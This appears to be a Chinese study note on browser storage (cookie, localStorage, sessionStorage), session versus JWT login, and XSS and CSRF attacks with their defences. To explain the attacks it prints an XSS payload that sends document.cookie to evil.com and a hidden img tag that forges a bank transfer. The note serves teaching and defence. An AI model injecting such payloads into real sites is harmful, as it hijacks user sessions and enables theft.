# Cookie localStorage SessionStorage

- 共性：cookie/localStorage/sessionStorage 本质都是浏览器端的存储方案，实现状态的存储方案
    - 都是键值对存储
        cookie  a=1;b=2
    - 都只能存字符串
    - 都要遵守同源策略
    - 都用于保存用户状态


## 区别

- cookie 可以在浏览器端，也可以在服务器端生成和获得，容量（4kb），每次都会在请求/响应中带上，过大会增加带宽消耗与解析延迟，影响请求性能。
    cookie/session（内存中的用户数据库） 机制
    小饼干 sessionId 可以到 session中去查找 用户对象



## Cookie/Session 登录方案
传统


## JWT双Token 登录方案
现代
- cookie、session是传统的登录解决方案，不适合现代前后端分离的开发方式。
    cookie只在浏览器端适合（自动带上），移动端不适合（token）
    session是用户通过登录表单提交数据，校验数据，生成sessionId，存储在cookie中。
    sessionId，在内存的session中存储用户对象。缺点：内存占用大，不适合高并发分布式场景。
    jwt直接decode，encode没有这个问题。

## XSS 攻击
Cross Site Scripting 跨站脚本攻击 黑客攻击的方式
在我们网站上挂码（病毒），评论区，文章发表区，文章发表区，黑到我们代码里植入一段恶意js 代码
攻击者把恶意js注入到页面中，在用户浏览器中执行

举个例子 比如评论区没有做过滤，用户输入
<script> fetch('https://evil.com?cookie=' + document.cookie) </script>
当别人打开页面时，这段脚本就会执行，把用户的 cookie 发送给攻击者。”
“常见危害就是：
窃取 cookie（劫持登录态） 冒充用户发请求 篡改页面内容”

httpOnly 怎么防XSS
cookie 一个属性，作用是禁止JavaScript 读取Cookie

- 不要相信用户的任何输入
    httpOnly 虽然会阻止读取cookie，但是xss攻击还会执行
    <script>alert('i hei you')</script>
  `<script></script>` html 进行转义
  &lt;script 不会执行

2. localStorage（长期存储）永久存储，除非手动删除 不会自动发送给服务器，容量大约 5Mb
多tab共享 

localStorage 持久化配置/缓存

界面主题切换/购物车临时存储/文章草稿箱自动保存/JWT/用户行为埋点
将用户的点击、浏览等行为数据先暂时存在本地，积攒到一定数量后，批量上报，降低网路请求频率
离线数据存储 商品分类列表 汽车之家
Web App和手机App 区别 本地存储

## sessionStorage 会话级临时状态
关闭tab 清除
页面滚动位置恢复，从首页到详情页面，回到首页的位置（滚动条复位）
多步骤流程，分步骤表单

## 核心区别
    cookie       localStorage      sessionStorage
    生命周期
    是否发送给服务器
    容量大小
    跨tab
    安全性  cookie更安全httpOnly

    same site策略

## CSRF攻击 跨站请求伪造
CSRF（跨站请求伪造）是指攻击者诱导已登录用户在不知情的情况下发起请求，从而以用户身份执行操作的攻击方式。 比如用户已登录银行网站，此时访问了一个恶意页面，页面中隐藏了一段代码：
`<img src="https://bank.com/transfer?toAccount=攻击者卡号&money=10000" style="display:none;">`
带上一个csrf token这个token 只有在 bank.com 能拿到，其他网站拿不到
分配一个token，bank.com才能得到

 服务端生成随机 token，下发给前端页面，因同源策略限制，恶意网站无法读取受害者域名下的响应头或页面内容，故无法获取该令牌。

``` html
<!-- HTML 部分 -->
<head>
  <meta name="csrf-token" content="a1b2c3d4-e5f6-7890-g1h2-i3j4k5l6m7n8">
</head>

<!-- JavaScript 部分 (以原生 JS 为例) -->
<script>
  // 1. 获取 Token
  const token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  // 2. 在请求中使用 (例如使用 fetch)
  fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': token  // 放入自定义请求头
    },
    body: JSON.stringify({ amount: 100 })
  });
</script>
fetch('/api/transfer', { method: 'POST', headers: { 'X-CSRF-Token': token } })
```

Set-Cookie: session=abc; SameSite=Strict    Strict:完全禁止跨站发送 Lax:部分允许（默认）

Lax + Referer
验证 Referer / Origin 👉 判断请求来源是否合法